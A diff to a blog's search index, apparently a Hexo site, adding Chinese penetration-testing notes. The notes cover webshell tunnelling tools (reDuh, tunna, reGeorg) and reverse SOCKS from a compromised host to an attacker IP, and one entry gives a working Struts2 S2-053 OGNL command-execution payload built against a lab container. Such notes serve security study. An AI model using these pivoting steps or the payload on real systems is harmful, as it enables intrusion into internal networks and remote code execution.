@@ -1,6 +1,31 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[脚本代理工具使用总结]]></title>
+    <url>%2F2017%2F09%2F13%2FscriptProxy%2F</url>
+    <content type="text"><![CDATA[如题 脚本代理工具使用总结理论：正向代理和反向代理 正向：我们发起请求，连接远程目标 反向：远程目标发起请求，绕过防火墙，连接我们的攻击机（需要有公网IP、端口） web脚本工具：reDuh（鼻祖，不太好用）使用方法： 内有客户端和服务端两个版本。先将服务端的文件上传到服务器上，尝试访问并记录链接。访问链接如上图则表明成功。然后打开客户端，将记录的链接放入，写入进行转发的端口号和要连接的目标机的IP（此时认为自己站在服务器上，如果输入127.0.0.1，则是连接服务器的某个端口），先点击start，然后点击Create。会将端口映射到自己电脑的指定端口。然后使用相应的程序连接自己本地的端口即可 tunna（不太好用）使用方法： 将webshells中的conn文件上传到服务器，访问文件如果是一片空格则证明成功了。 攻击机使用命令： python proxy.py -u 连接网址 -l 本地端口 -r 目标端口 -a 127.0.0.1 例：1python proxy.py -u http://192.168.20.54/uploads/scanGE/conn.php -l 2222 -r 3389 -a 192.168.5.136 则连接本地的2222相当于连接内网192.168.5.136的3389如果此时映射3389（假设对方不允许远程登录），则也可以成功连接。 如果只监听自己的2222，不指定对方端口，则需要配合代理软件（例如shadowsocks需要使用firefox的代理来配合） reGeorg+proxifier（或sc32.exe）（目前最好用的）原理： Proxifier可以让指定程序的流量全部走指定的端口，而reGeorgSocksProxy脚本可以将服务器映射到本地监听端口，则所有通过本地监听端口的流量就相当于是走了服务器，所以可以访问到服务器内网 使用方法： 将tunnel文件上传的服务器，访问文件网址，出现下图则证明成功攻击机上执行： python reGeorgSocksProxy -u 木马网址 -p 本地监听端口 例：1python reGeorgSocksProxy.py -u http://192.168.20.54/uploads/scanGE/tunnel.php -p 1234 使用Proxifier工具进行端口代理 打开proxifier端口代理工具——》Profile——》proxy Servers 添加一个 127.0.0.1 本地监听端口号 socket 5Proxifier——》Proxification Rules——》添加对应的程序（例如3389用mstsc）——》下面action选择刚刚添加的代理——》Target Ports 输入目标IP和端口（此时认为自己是服务器，如果是扫描器则不能输入IP和端口）——》打上对勾——》OK——》（如果不好用，可以指定端口和IP尝试一下）此时再使用刚刚选择的程序，则那个程序全部走指定流量，例如使用mstsc，输入内网机IP（此时自己站在服务器的视角），即可成功连接 也可以直接加载端口扫描器之类的进行内网扫描不使用Proxifier，也可以使用sc32.exe进行端口代理文件——》设置——》SOCKS设置——》SOCKS版本5——》确定新建——》mstsc.exe——》运行]]></content>
+      <categories>
+        <category>端口转发</category>
+      </categories>
+      <tags>
+        <tag>代理</tag>
+        <tag>端口转发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[ssocks（RCSOCKS代理工具套装）]]></title>
+    <url>%2F2017%2F09%2F13%2Fssocks%2F</url>
+    <content type="text"><![CDATA[SSOCKS的使用方法记录 SSOCKS（RCSOCKS代理工具套装）这个工具有两个版本：windows和Linux的，可以混用 Windows的直接使用ssocks-win32即可 Linux的需要先进行编译：./configure make ssocksd 用来开启Socks5代理服务 ssocks 本地启用Socks5服务，并反弹到另一IP地址 rcsocks 接收反弹过来的Socks5服务，并转向另一端口 使用说明：Linux中： 12345攻击机上：./rcsocks -l 10086 -p 10010 -vv肉鸡上：./rssocks -vv -s 攻击机IP:10010kali中自带proxychains端口代理工具/etc/proxychains.conf 进行配置（底部）127.0.0.1 socks5 10086proxychains ssh root@ip（此处的IP假设自己是肉鸡） 然后该软件就会走刚设置的端口 windows则需要在cmd中运行，使用方法同Linux类似]]></content>
+      <categories>
+        <category>端口转发</category>
+      </categories>
+      <tags>
+        <tag>代理</tag>
+        <tag>端口转发</tag>
+        <tag>ssocks</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）]]></title>
     <url>%2F2017%2F09%2F08%2Fst2-053%2F</url>
     <content type="text"><![CDATA[使用docker拉取的环境 Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）漏洞信息 ● S2-053 公告 获取环境: 1.拉取镜像到本地 1$ docker pull medicean/vulapps:s_struts2_s2-053 2.启动环境 1$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-053 -p 80:8080 前面的 80 代表物理机的端口，可随意指定。 使用与利用 访问 http://你的 IP 地址:端口号/ PoC 1.访问 Demo 页面, 随便输入值，可看到页面输出我们提交的值 2.在输入框中输入 %{100-3}，然后提交，发现 %{} 中的表达式被执行 Exp 命令执行 Exp: 1%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;/usr/bin/touch /tmp/vuln&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 替换Exp中的 (#cmd=’/usr/bin/touch /tmp/vuln’) 中的命令即可 修复建议 升级Apache struts 至 2.5.12 版本 或者 2.3.34 版本 参考链接 S2-053 公告 S2-053 复现分析过程(附POC) 猎户攻防实验室]]></content>
@@ -79,8 +104,8 @@
         <category>端口转发</category>
       </categories>
       <tags>
-        <tag>端口转发</tag>
         <tag>代理</tag>
+        <tag>端口转发</tag>
       </tags>
   </entry>
   <entry>
